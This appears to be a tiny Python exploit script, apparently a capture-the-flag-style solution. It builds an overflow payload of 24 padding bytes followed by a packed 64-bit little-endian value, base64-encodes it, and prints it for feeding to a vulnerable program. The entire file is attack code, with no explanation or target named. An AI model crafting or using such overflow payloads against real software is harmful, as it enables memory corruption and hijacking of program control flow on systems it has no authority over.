
import sys
import struct
import base64

buf = b'MMMMMMMMMMMMMMMMMMMMMMMM'
buf += struct.pack('<Q', 4020045165030412030)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
